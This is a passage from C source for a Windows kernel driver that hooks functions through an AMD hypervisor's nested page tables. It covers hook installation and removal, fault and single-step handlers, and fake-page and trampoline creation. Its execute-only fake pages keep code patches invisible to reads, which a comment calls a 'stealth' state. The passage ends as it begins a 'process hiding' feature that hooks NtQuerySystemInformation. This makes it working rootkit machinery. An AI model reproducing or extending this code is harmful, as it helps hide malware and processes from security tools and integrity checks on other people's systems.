    __finally {
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    }
}

NTSTATUS
NptHookInstall(
    _In_ PVOID TargetAddress,
    _In_ PVOID HookFunction,
    _Out_opt_ PNPT_HOOK_ENTRY* OutHookEntry
)
{
    PNPT_HOOK_ENTRY hookEntry = NULL;
    PVOID trampoline = NULL;
    NTSTATUS status;

    if (OutHookEntry) {
        *OutHookEntry = NULL;
    }

    status = NptHookPrepare(
        TargetAddress, HookFunction, &hookEntry, &trampoline);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = NptHookActivate(hookEntry);
    if (!NT_SUCCESS(status)) {
        NTSTATUS rollbackStatus = NptHookRemove(hookEntry);
        if (!NT_SUCCESS(rollbackStatus)) {
            /* Keep a concrete owner for the still-linked Quiescing entry.
             * Legacy callers that requested a handle can retry targeted
             * removal; otherwise manager RemoveAll owns the retry. */
            if (OutHookEntry) {
                *OutHookEntry = hookEntry;
            }
            DbgPrint("[NPT-Hook] Activate failed 0x%X; rollback retained %p (0x%X, owner=%s)\n",
                     status,
                     hookEntry,
                     rollbackStatus,
                     OutHookEntry ? "caller" : "manager");
        }
        return status;
    }

    UNREFERENCED_PARAMETER(trampoline);
    if (OutHookEntry) {
        *OutHookEntry = hookEntry;
    }
    return STATUS_SUCCESS;
}

// ============================================================
// Hook 移除
// ============================================================

NTSTATUS
NptHookRemove(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    if (!HookEntry) return STATUS_INVALID_PARAMETER;
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (HookEntry->State == NptHookStateRetired) {
        return STATUS_SUCCESS;
    }
    if (InterlockedCompareExchange(&HookEntry->Removing, 1, 0) != 0) {
        return HookEntry->State == NptHookStateRetired
            ? STATUS_SUCCESS
            : STATUS_DEVICE_BUSY;
    }
    return NptHookpRemoveClaimed(HookEntry);
}

static NTSTATUS
NptHookpRemoveClaimed(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    KIRQL oldIrql;
    ULONG oldEpoch;
    PNPT_HOOK_PAGE pageOwner;
    BOOLEAN wasPrepared;
    BOOLEAN wasActive;
    NTSTATUS status = STATUS_SUCCESS;

    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);

    if (HookEntry->State == NptHookStateRetired) {
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
        return STATUS_SUCCESS;
    }
    if (HookEntry->State != NptHookStatePrepared &&
        HookEntry->State != NptHookStateActive &&
        HookEntry->State != NptHookStateQuiescing) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    }
    
    pageOwner = HookEntry->PageOwner;
    if (!pageOwner) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    }

    wasPrepared = (HookEntry->State == NptHookStatePrepared);
    wasActive = (HookEntry->State == NptHookStateActive ||
                 HookEntry->State == NptHookStateQuiescing);

    if (wasPrepared && pageOwner->State == NptHookStateQuiescing) {
        /* Cancel a failed additional-site Activate transaction. */
        status = NptHookpQuiescePage(
            pageOwner,
            HookEntry,
            NptHookPageMutationActivate);
        if (!NT_SUCCESS(status)) {
            goto Exit;
        }
        pageOwner->MutationSite = NULL;
        pageOwner->MutationKind = NptHookPageMutationNone;
        InterlockedExchange(
            (volatile LONG*)&pageOwner->State,
            (LONG)NptHookStateActive);
        NptHookpPublishSteadyLeaves(pageOwner);
    } else if (wasActive) {
        if (pageOwner->State != NptHookStateActive &&
            pageOwner->State != NptHookStateQuiescing) {
            status = STATUS_INVALID_DEVICE_STATE;
            goto Exit;
        }
        if (pageOwner->State == NptHookStateQuiescing &&
            (pageOwner->MutationSite != HookEntry ||
             pageOwner->MutationKind != NptHookPageMutationRemove)) {
            status = STATUS_DEVICE_BUSY;
            goto Exit;
        }
        InterlockedExchange(
            (volatile LONG*)&HookEntry->State,
            (LONG)NptHookStateQuiescing);
        status = NptHookpQuiescePage(
            pageOwner,
            HookEntry,
            NptHookPageMutationRemove);
        if (!NT_SUCCESS(status)) {
            goto Exit;
        }
        if (pageOwner->ActiveSiteCount == 0) {
            status = STATUS_INVALID_DEVICE_STATE;
            goto Exit;
        }
        NptHookpRebuildCompositePage(pageOwner, NULL, HookEntry);
        --pageOwner->ActiveSiteCount;
    } else if (!wasPrepared) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    } else if (pageOwner->State == NptHookStateQuiescing) {
        status = STATUS_DEVICE_BUSY;
        goto Exit;
    }

    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    RemoveEntryList(&HookEntry->ListEntry);
    RemoveEntryList(&HookEntry->PageListEntry);
    if (g_NptHookManager.HookCount != 0) {
        --g_NptHookManager.HookCount;
    }
    if (pageOwner->SiteCount != 0) {
        --pageOwner->SiteCount;
    }
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

    if (pageOwner->AccountingSite == HookEntry) {
        PLIST_ENTRY siteLink;

        pageOwner->AccountingSite = NULL;
        for (siteLink = pageOwner->SiteList.Flink;
             siteLink != &pageOwner->SiteList;
             siteLink = siteLink->Flink) {
            PNPT_HOOK_ENTRY sibling = CONTAINING_RECORD(
                siteLink, NPT_HOOK_ENTRY, PageListEntry);
            if (sibling->State == NptHookStateActive) {
                pageOwner->AccountingSite = sibling;
                break;
            }
        }
    }

    MemoryBarrier();
    InterlockedExchange(
        (volatile LONG*)&HookEntry->State,
        (LONG)NptHookStateRetired);
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    InsertTailList(&g_NptHookManager.RetiredHookList, &HookEntry->ListEntry);
    g_NptHookManager.RetiredHookCount++;
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

    if (pageOwner->ActiveSiteCount != 0) {
        pageOwner->MutationSite = NULL;
        pageOwner->MutationKind = NptHookPageMutationNone;
        InterlockedExchange(
            (volatile LONG*)&pageOwner->State,
            (LONG)NptHookStateActive);
        NptHookpPublishSteadyLeaves(pageOwner);
    } else if (pageOwner->SiteCount != 0) {
        NptHookpRebuildCompositePage(pageOwner, NULL, NULL);
        pageOwner->TargetPteCount = 0;
        RtlZeroMemory(pageOwner->TargetPte, sizeof(pageOwner->TargetPte));
        RtlZeroMemory(
            pageOwner->OriginalPteValue,
            sizeof(pageOwner->OriginalPteValue));
        pageOwner->MutationSite = NULL;
        pageOwner->MutationKind = NptHookPageMutationNone;
        InterlockedExchange(
            (volatile LONG*)&pageOwner->State,
            (LONG)NptHookStatePrepared);
    } else {
        KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
        RemoveEntryList(&pageOwner->ListEntry);
        if (g_NptHookManager.PageCount != 0) {
            --g_NptHookManager.PageCount;
        }
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

        oldEpoch = NptHookpAdvanceRootEpoch();
        while (!NptHookpWaitRootEpoch(oldEpoch)) {
            DbgPrint("[NPT-Hook] Waiting for retired page readers\n");
        }
        pageOwner->TargetPteCount = 0;
        pageOwner->MutationSite = NULL;
        pageOwner->MutationKind = NptHookPageMutationNone;
        InterlockedExchange(
            (volatile LONG*)&pageOwner->State,
            (LONG)NptHookStateRetired);
        KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
        InsertTailList(
            &g_NptHookManager.RetiredPageList,
            &pageOwner->ListEntry);
        ++g_NptHookManager.RetiredPageCount;
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    }

    HookEntry->PatchInstalled = FALSE;
    HookEntry->PageOwner = NULL;

    DbgPrint("[NPT-Hook] Site removed and retired: %p\n",
             HookEntry->TargetVirtualAddress);

    ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    return STATUS_SUCCESS;

Exit:
    ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    InterlockedExchange(&HookEntry->Removing, 0);
    return status;
}

NTSTATUS
NptHookRemoveByAddress(
    _In_ PVOID TargetAddress
)
{
    PNPT_HOOK_ENTRY hookEntry = NULL;
    KIRQL oldIrql;

    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    for (PLIST_ENTRY link = g_NptHookManager.HookList.Flink;
         link != &g_NptHookManager.HookList;
         link = link->Flink) {
        PNPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
            link, NPT_HOOK_ENTRY, ListEntry);
        if (candidate->TargetVirtualAddress == TargetAddress &&
            InterlockedCompareExchange(
                &candidate->Removing, 1, 0) == 0) {
            hookEntry = candidate;
            break;
        }
    }
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    if (!hookEntry) {
        return STATUS_NOT_FOUND;
    }

    return NptHookpRemoveClaimed(hookEntry);
}

VOID
NptHookRemoveAll(VOID)
{
    for (;;) {
        KIRQL oldIrql;
        PNPT_HOOK_ENTRY hookEntry = NULL;
        NTSTATUS status;

        KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
        if (!IsListEmpty(&g_NptHookManager.HookList)) {
            PLIST_ENTRY link;

            /* A timed-out page transaction must be resumed by its owning
             * site before RemoveAll can touch siblings on that page. */
            for (link = g_NptHookManager.HookList.Flink;
                 link != &g_NptHookManager.HookList;
                 link = link->Flink) {
                PNPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
                    link, NPT_HOOK_ENTRY, ListEntry);
                if (candidate->PageOwner &&
                    candidate->PageOwner->State == NptHookStateQuiescing &&
                    candidate->PageOwner->MutationSite == candidate &&
                    InterlockedCompareExchange(
                        &candidate->Removing, 1, 0) == 0) {
                    hookEntry = candidate;
                    break;
                }
            }
            if (!hookEntry) {
                PNPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
                    g_NptHookManager.HookList.Flink,
                    NPT_HOOK_ENTRY,
                    ListEntry);
                if (InterlockedCompareExchange(
                        &candidate->Removing, 1, 0) == 0) {
                    hookEntry = candidate;
                }
            }
        }
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

        if (!hookEntry) break;
        status = NptHookpRemoveClaimed(hookEntry);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] RemoveAll retained an entry: 0x%X\n", status);
            break;
        }
    }

    DbgPrint("[NPT-Hook] RemoveAll complete; remaining=%lu\n",
             g_NptHookManager.HookCount);
}

// ============================================================
// NPF (Nested Page Fault) 处理
// ============================================================

/*
 * 启用单步执行（通过 #DB）
 */
static BOOLEAN
NptHookpAppendPendingPage(
    _Inout_ PNPT_STEP_CONTEXT StepContext,
    _In_ PNPT_HOOK_PAGE PageOwner)
{
    ULONG i;

    for (i = 0;
         i < StepContext->PendingPageCount &&
         i < RTL_NUMBER_OF(StepContext->PendingPages);
         ++i) {
        if (StepContext->PendingPages[i] == PageOwner) {
            return TRUE;
        }
    }
    if (StepContext->PendingPageCount >=
        RTL_NUMBER_OF(StepContext->PendingPages)) {
        return FALSE;
    }
    StepContext->PendingPages[StepContext->PendingPageCount++] = PageOwner;
    MemoryBarrier();
    return TRUE;
}

static BOOLEAN
NptHookpArmSingleStep(
    _In_ PVCPU_DATA VcpuData,
    _Inout_ PNPT_STEP_CONTEXT StepContext,
    _In_ PNPT_HOOK_PAGE PageOwner)
{
    if (!VcpuData || !VcpuData->Vmcb || !StepContext || !PageOwner) {
        return FALSE;
    }

    if (InterlockedCompareExchange(&StepContext->StepActive, 0, 0) != 0) {
        return NptHookpAppendPendingPage(StepContext, PageOwner);
    }

    StepContext->PendingPageCount = 0;
    StepContext->GuestTfWasSet =
        (VcpuData->Vmcb->StateSaveArea.Rflags & 0x100ULL) != 0;
    StepContext->DbInterceptWasSet =
        (VcpuData->Vmcb->ControlArea.InterceptExceptions & (1ULL << 1)) != 0;
    if (!NptHookpAppendPendingPage(StepContext, PageOwner)) {
        return FALSE;
    }

    VcpuData->Vmcb->StateSaveArea.Rflags |= 0x100ULL;
    VcpuData->Vmcb->ControlArea.InterceptExceptions |= (1ULL << 1);
    MemoryBarrier();
    InterlockedExchange(&StepContext->StepActive, 1);
    return TRUE;
}

/*
 * 禁用单步执行
 */
static BOOLEAN
NptHookpRestoreGuestDebugState(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_STEP_CONTEXT StepContext)
{
    BOOLEAN reinject = FALSE;

    if (!VcpuData || !VcpuData->Vmcb || !StepContext) {
        return FALSE;
    }

    if (StepContext->GuestTfWasSet) {
        VcpuData->Vmcb->StateSaveArea.Rflags |= 0x100ULL;
        reinject = TRUE;
    } else {
        VcpuData->Vmcb->StateSaveArea.Rflags &= ~0x100ULL;
    }
    if (StepContext->DbInterceptWasSet) {
        VcpuData->Vmcb->ControlArea.InterceptExceptions |= (1ULL << 1);
    } else {
        VcpuData->Vmcb->ControlArea.InterceptExceptions &= ~(1ULL << 1);
    }

    /* Do not swallow a hardware-breakpoint/BD/BT event that coincided with
     * our forced BS single step. */
    if ((VcpuData->Vmcb->StateSaveArea.Dr6 & 0xB00FULL) != 0) {
        reinject = TRUE;
    }
    return reinject;
}

BOOLEAN
NptHookHandleNpf(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 GuestPhysicalAddress,
    _In_ ULONG64 ErrorCode
)
{
    PNPT_HOOK_PAGE pageOwner;
    PNPT_HOOK_ENTRY accountingSite;
    ULONG64 pagePhysical;
    BOOLEAN isFetch;
    ULONG cpuIndex;
    PNPT_STEP_CONTEXT stepCtx;
    ULONG rootEpoch;

    if (!VcpuData || !VcpuData->Vmcb ||
        VcpuData->ProcessorNumber >= 64) {
        return FALSE;
    }
    cpuIndex = VcpuData->ProcessorNumber;
    
    // 解析错误码
    pagePhysical = GuestPhysicalAddress & PAGE_MASK;
    isFetch = (ErrorCode & NPF_FETCH) != 0;
    
    if (!NptHookpAcquireRootEpoch(&rootEpoch)) {
        return FALSE;
    }

    // A VM-exit resolves the unique GPA owner, never an arbitrary site.
    pageOwner = NptHookpFindPageByPhysicalAddressNoLock(pagePhysical);
    
    if (!pageOwner) {
        NptHookpReleaseRootEpoch(rootEpoch);
        return FALSE;
    }
    
    // 验证 Hook 有效
    if (pageOwner->State != NptHookStateActive) {
        NptHookpReleaseRootEpoch(rootEpoch);
        return FALSE;
    }

    accountingSite = (PNPT_HOOK_ENTRY)pageOwner->AccountingSite;
    if (accountingSite &&
        accountingSite->State == NptHookStateActive) {
        InterlockedIncrement64(&accountingSite->HitCount);
    }
    
    stepCtx = &g_NptHookManager.StepContext[cpuIndex];

    /* Steady state is the original PFN with RW+NX.  Only an instruction
     * fetch may expose the composite fake PFN, and every such exposure is
     * recorded in this CPU's pending-page set for #DB restoration. */
    if (isFetch) {
        if (!NptHookpArmSingleStep(VcpuData, stepCtx, pageOwner)) {
            NptHookpReleaseRootEpoch(rootEpoch);
            return FALSE;
        }
        NptSwitchToFakePage(VcpuData, pageOwner);
    } else {
        /* A data fault is defensive/stale: restore the stealth steady state.
         * Ordinary reads and writes then complete against the original PFN. */
        NptSwitchToOriginalPage(VcpuData, pageOwner);
    }
    
    NptHookpReleaseRootEpoch(rootEpoch);
    return TRUE;
}

/*
 * 处理单步执行后恢复
 */
BOOLEAN
NptHookHandleSingleStep(
    _In_ PVCPU_DATA VcpuData
)
{
    ULONG cpuIndex;
    ULONG i;
    PNPT_STEP_CONTEXT stepCtx;
    BOOLEAN reinject;
    
    if (!VcpuData || !VcpuData->Vmcb ||
        VcpuData->ProcessorNumber >= 64) {
        return FALSE;
    }

    cpuIndex = VcpuData->ProcessorNumber;
    stepCtx = &g_NptHookManager.StepContext[cpuIndex];
    
    // Claim ARMED(1) -> COMPLETING(2); removal waits for zero.
    if (InterlockedCompareExchange(&stepCtx->StepActive, 2, 1) != 1) {
        /*
         * Not our #DB.  Guest TF and the #DB intercept may belong to a real
         * debugger/hardware breakpoint; only the owner that armed this
         * context is allowed to clear them.
         */
        return FALSE;
    }
    
    MemoryBarrier();
    for (i = 0;
         i < stepCtx->PendingPageCount &&
         i < RTL_NUMBER_OF(stepCtx->PendingPages);
         ++i) {
        PNPT_HOOK_PAGE pageOwner = stepCtx->PendingPages[i];
        if (pageOwner && pageOwner->State == NptHookStateActive) {
            NptSwitchToOriginalPage(VcpuData, pageOwner);
        }
    }

    reinject = NptHookpRestoreGuestDebugState(VcpuData, stepCtx);
    for (i = 0;
         i < stepCtx->PendingPageCount &&
         i < RTL_NUMBER_OF(stepCtx->PendingPages);
         ++i) {
        stepCtx->PendingPages[i] = NULL;
    }
    stepCtx->PendingPageCount = 0;
    stepCtx->GuestTfWasSet = FALSE;
    stepCtx->DbInterceptWasSet = FALSE;
    MemoryBarrier();
    InterlockedExchange(&stepCtx->StepActive, 0);
    return reinject ? FALSE : TRUE;
}

// ============================================================
// NPT 页切换
// ============================================================

static VOID
NptSwitchToFakePage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_PAGE PageOwner
)
{
    PNPT_PTE pte;
    
    if (!PageOwner || PageOwner->State != NptHookStateActive) {
        return;
    }
    
    pte = NptGetPteForPhysicalAddress(
        VcpuData, PageOwner->TargetPhysicalAddress);
    if (!pte) {
        return;
    }
    
    // 指向 FakePage，允许执行
    NptHookpUpdatePteAtomic(
        pte,
        TRUE,
        PageOwner->FakePagePhysical >> 12,
        TRUE,
        TRUE,
        FALSE);
    
    NptInvalidateTlb(VcpuData);
}

static VOID
NptSwitchToOriginalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_PAGE PageOwner
)
{
    PNPT_PTE pte;
    
    if (!PageOwner || PageOwner->State != NptHookStateActive) {
        return;
    }
    
    pte = NptGetPteForPhysicalAddress(
        VcpuData, PageOwner->TargetPhysicalAddress);
    if (!pte) {
        return;
    }
    
    // 指向原始页，允许读写但禁止执行
    NptHookpUpdatePteAtomic(
        pte,
        TRUE,
        PageOwner->TargetPhysicalAddress >> 12,
        TRUE,
        TRUE,
        TRUE);
    
    NptInvalidateTlb(VcpuData);
}

// ============================================================
// 辅助函数
// ============================================================

PNPT_HOOK_ENTRY
NptHookFindByPhysicalAddress(
    _In_ ULONG64 PhysicalAddress
)
{
    PLIST_ENTRY entry;
    ULONG64 pagePhysical = PhysicalAddress & PAGE_MASK;
    KIRQL oldIrql;
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    
    for (entry = g_NptHookManager.PageList.Flink;
         entry != &g_NptHookManager.PageList;
         entry = entry->Flink)
    {
        PNPT_HOOK_PAGE pageOwner = CONTAINING_RECORD(
            entry, NPT_HOOK_PAGE, ListEntry);
        if (pageOwner->TargetPhysicalAddress == pagePhysical ||
            pageOwner->FakePagePhysical == pagePhysical) {
            if (!IsListEmpty(&pageOwner->SiteList)) {
                PLIST_ENTRY siteLink;
                PNPT_HOOK_ENTRY site = NULL;

                for (siteLink = pageOwner->SiteList.Flink;
                     siteLink != &pageOwner->SiteList;
                     siteLink = siteLink->Flink) {
                    PNPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
                        siteLink, NPT_HOOK_ENTRY, PageListEntry);
                    if (!site) {
                        site = candidate;
                    }
                    if (candidate->State == NptHookStateActive) {
                        site = candidate;
                        break;
                    }
                }
                KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
                return site;
            }
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    return NULL;
}

static PNPT_HOOK_PAGE
NptHookpFindPageByPhysicalAddressNoLock(
    _In_ ULONG64 PhysicalAddress
)
{
    PLIST_ENTRY entry;
    PNPT_HOOK_PAGE pageOwner;
    ULONG64 pagePhysical = PhysicalAddress & PAGE_MASK;
    
    for (entry = g_NptHookManager.PageList.Flink;
         entry != &g_NptHookManager.PageList;
         entry = entry->Flink)
    {
        pageOwner = CONTAINING_RECORD(entry, NPT_HOOK_PAGE, ListEntry);
        if (pageOwner->TargetPhysicalAddress == pagePhysical ||
            pageOwner->FakePagePhysical == pagePhysical) {
            return pageOwner;
        }
    }
    
    return NULL;
}

PNPT_HOOK_ENTRY
NptHookFindByVirtualAddress(
    _In_ PVOID VirtualAddress
)
{
    PLIST_ENTRY entry;
    PNPT_HOOK_ENTRY hookEntry;
    KIRQL oldIrql;
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    
    for (entry = g_NptHookManager.HookList.Flink;
         entry != &g_NptHookManager.HookList;
         entry = entry->Flink)
    {
        hookEntry = CONTAINING_RECORD(entry, NPT_HOOK_ENTRY, ListEntry);
        if (hookEntry->TargetVirtualAddress == VirtualAddress) {
            KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
            return hookEntry;
        }
    }
    
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    return NULL;
}

PVOID
NptHookGetTrampoline(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    if (!HookEntry) {
        return NULL;
    }
    return HookEntry->TrampolineAddress;
}

// ============================================================
// 伪造页和跳板创建
// ============================================================

static NTSTATUS
NptCreateFakePage(
    _Inout_ PNPT_HOOK_PAGE PageOwner,
    _In_ PVOID TargetAddress
)
{
    PHYSICAL_ADDRESS maxAddr;
    PUCHAR targetPage;
    
    maxAddr.QuadPart = -1LL;
    
    // 分配伪造页
    PageOwner->FakePageVirtual = MmAllocateContiguousMemory(
        PAGE_SIZE_4KB, maxAddr);
    if (!PageOwner->FakePageVirtual) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    PageOwner->FakePagePhysical =
        MmGetPhysicalAddress(PageOwner->FakePageVirtual).QuadPart;
    
    // 复制原始页内容
    targetPage = (PUCHAR)((ULONG_PTR)TargetAddress & PAGE_MASK);
    RtlCopyMemory(PageOwner->FakePageVirtual, targetPage, PAGE_SIZE_4KB);
    
    DbgPrint("[NPT-Hook] Created fake page: VA=%p PA=0x%llx\n",
        PageOwner->FakePageVirtual, PageOwner->FakePagePhysical);
    
    return STATUS_SUCCESS;
}

/*
 * 创建跳板（用于调用原函数）
 *
 * 2026-06-16 方案 A 改写: 委派给共享重写器 HvHookRewriteTrampoline (镜像 EPT 路径)。
 *   - 旧 NptRelocateRelativeInstructions 整个删除。
 *   - 短跳扩 rel32, 后续指令偏移整体重算, RIP-relative disp32 按新 RIP 重算。
 *   - LOOPxx/JECXZ + 解码失败 + 距离 >2GB → 拒装。
 */
static NTSTATUS
NptCreateTrampoline(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    UCHAR scratch[128];
    HV_TRAMP_REWRITE_RESULT rr;
    PUCHAR trampoline;
    ULONG worstCase;
    ULONG worstAligned;
    ULONG actualSize;
    ULONG actualAligned;
#if !NPT_HOOK_SIMPLE_MODE
    NTSTATUS st;
#endif

    // ---- 阶段 A: 保守上界预约池空间, 但不 commit ----
    worstCase    = HookEntry->OriginalBytesLength * 3 + sizeof(NptJmpTemplate);
    worstAligned = (worstCase + 0x0F) & ~0x0FUL;

    if (g_NptHookManager.TrampolinePoolUsed + worstAligned > PAGE_SIZE_4KB * 4) {
        DbgPrint("[NPT-Hook] Trampoline pool exhausted (need worst-case %u aligned, have %u)\n",
                 worstAligned,
                 PAGE_SIZE_4KB * 4 - g_NptHookManager.TrampolinePoolUsed);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    trampoline = (PUCHAR)g_NptHookManager.TrampolinePool +
                 g_NptHookManager.TrampolinePoolUsed;

#if NPT_HOOK_SIMPLE_MODE
    {
        ULONG i;
        DbgPrint("[NPT-Hook] SIMPLE_MODE: skipping rewriter, direct copy %u bytes\n",
                 HookEntry->OriginalBytesLength);
        RtlCopyMemory(scratch, HookEntry->OriginalBytes, HookEntry->OriginalBytesLength);
        rr.DstLen = HookEntry->OriginalBytesLength;
        rr.InstCount = 0;
        for (i = 0; i < HV_TRAMP_MAX_INSTS; i++) {
            rr.OrigOffsets[i] = 0;
            rr.NewOffsets[i] = 0;
            rr.Types[i] = 0;
        }
    }
#else
    st = HvHookRewriteTrampoline(
        HookEntry->OriginalBytes,
        HookEntry->OriginalBytesLength,
        (ULONG_PTR)HookEntry->TargetVirtualAddress,
        scratch, sizeof(scratch),
        (ULONG_PTR)trampoline,
        &rr);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[NPT-Hook] HvHookRewriteTrampoline failed: 0x%X (srcLen=%u)\n",
                 st, HookEntry->OriginalBytesLength);
        return st;
    }
#endif

    // 拷到池
    RtlCopyMemory(trampoline, scratch, rr.DstLen);

    // 14 字节 jmp-back (本地缓冲单次写入)
    {
        UCHAR jmpBuf[sizeof(NptJmpTemplate)];
        RtlCopyMemory(jmpBuf, NptJmpTemplate, 6);
        *(PVOID*)(jmpBuf + 6) =
            (PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength;
        RtlCopyMemory(trampoline + rr.DstLen, jmpBuf, sizeof(jmpBuf));
    }

    // 阶段 B: commit 实际占用
    actualSize    = rr.DstLen + sizeof(NptJmpTemplate);
    actualAligned = (actualSize + 0x0F) & ~0x0FUL;
    g_NptHookManager.TrampolinePoolUsed += actualAligned;

    if (actualAligned > actualSize) {
        RtlFillMemory(trampoline + actualSize, actualAligned - actualSize, 0xCC);
    }

    HookEntry->TrampolineAddress     = trampoline;
    HookEntry->TrampolineWriteLength = rr.DstLen;
    HookEntry->TrampolineInstCount   = rr.InstCount;

    // ---- 完整 dump + 重写映射 ----
    DbgPrint("[NPT-Hook] Trampoline at %p (srcLen=%u dstLen=%u instCount=%u alignedSize=%u):\n",
             trampoline, HookEntry->OriginalBytesLength, rr.DstLen, rr.InstCount, actualAligned);
    {
        ULONG dumpLen = actualAligned + 16;
        if (dumpLen > 80) dumpLen = 80;
        for (ULONG dpi = 0; dpi < dumpLen; dpi += 16) {
            DbgPrint("[NPT-Hook]   +0x%02X: %02X %02X %02X %02X %02X %02X %02X %02X "
                     "%02X %02X %02X %02X %02X %02X %02X %02X\n",
                     dpi,
                     trampoline[dpi+0],  trampoline[dpi+1],  trampoline[dpi+2],  trampoline[dpi+3],
                     trampoline[dpi+4],  trampoline[dpi+5],  trampoline[dpi+6],  trampoline[dpi+7],
                     trampoline[dpi+8],  trampoline[dpi+9],  trampoline[dpi+10], trampoline[dpi+11],
                     trampoline[dpi+12], trampoline[dpi+13], trampoline[dpi+14], trampoline[dpi+15]);
        }
    }

#if !NPT_HOOK_SIMPLE_MODE
    {
        ULONG ri;
        for (ri = 0; ri < rr.InstCount; ri++) {
            DbgPrint("[NPT-Hook]   #%u orig+0x%02X -> new+0x%02X  type=%u\n",
                     ri, rr.OrigOffsets[ri], rr.NewOffsets[ri], rr.Types[ri]);
        }
    }
#endif

    // 自检
    {
        ULONG off = 0;
        ULONG step = 0;
        HV_INST_INFO info;
        BOOLEAN selfCheckOk = TRUE;
        while (off < rr.DstLen && step < HV_TRAMP_MAX_INSTS + 2) {
            if (!HvLdeDecode(trampoline + off, &info) || info.Length == 0) {
                DbgPrint("[NPT-Hook] *** SELF-CHECK FAIL *** decode failure at trampoline+0x%X "
                         "(byte 0x%02X)\n", off, trampoline[off]);
                selfCheckOk = FALSE;
                break;
            }
            off += info.Length;
            step++;
        }
        if (selfCheckOk && off != rr.DstLen) {
            DbgPrint("[NPT-Hook] *** SELF-CHECK FAIL *** instruction boundary mismatch: "
                     "decoded=%u expected=%u\n", off, rr.DstLen);
            selfCheckOk = FALSE;
        }
        if (selfCheckOk) {
            if (trampoline[rr.DstLen]     == 0xFF &&
                trampoline[rr.DstLen + 1] == 0x25 &&
                *(PVOID*)(trampoline + rr.DstLen + 6) ==
                    (PVOID)((PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength))
            {
                DbgPrint("[NPT-Hook] Self-check OK: %u instructions over %u bytes, jmp-back -> %p\n",
                         step, off,
                         (PVOID)((PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength));
            } else {
                DbgPrint("[NPT-Hook] *** SELF-CHECK FAIL *** jmp-back template wrong at +0x%X\n", rr.DstLen);
            }
        }
    }

    DbgPrint("[NPT-Hook]   Jump back to: %p\n",
        (PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength);

    return STATUS_SUCCESS;
}

// ============================================================
// NPT 权限修改
// ============================================================

NTSTATUS
NptModifyPagePermissions(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress,
    _In_ BOOLEAN Present,
    _In_ BOOLEAN Write,
    _In_ BOOLEAN NoExecute
)
{
    PNPT_PTE pte;
    
    pte = NptGetPteForPhysicalAddress(VcpuData, PhysicalAddress);
    if (!pte) {
        return STATUS_NOT_FOUND;
    }
    
    NptHookpUpdatePteAtomic(
        pte,
        FALSE,
        0,
        Present,
        Write,
        NoExecute);
    
    NptIncrementVersion();
    
    return STATUS_SUCCESS;
}

NTSTATUS
NptRemapPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 OriginalPhysical,
    _In_ ULONG64 NewPhysical,
    _In_ BOOLEAN Present,
    _In_ BOOLEAN Write,
    _In_ BOOLEAN NoExecute
)
{
    PNPT_PTE pte;
    
    pte = NptGetPteForPhysicalAddress(VcpuData, OriginalPhysical);
    if (!pte) {
        return STATUS_NOT_FOUND;
    }
    
    NptHookpUpdatePteAtomic(
        pte,
        TRUE,
        NewPhysical >> 12,
        Present,
        Write,
        NoExecute);
    
    NptIncrementVersion();
    
    return STATUS_SUCCESS;
}

// ============================================================
// 高级功能：进程隐藏
// ============================================================

// 原始函数类型
typedef NTSTATUS (NTAPI *PFN_NptNtQuerySystemInformation)(
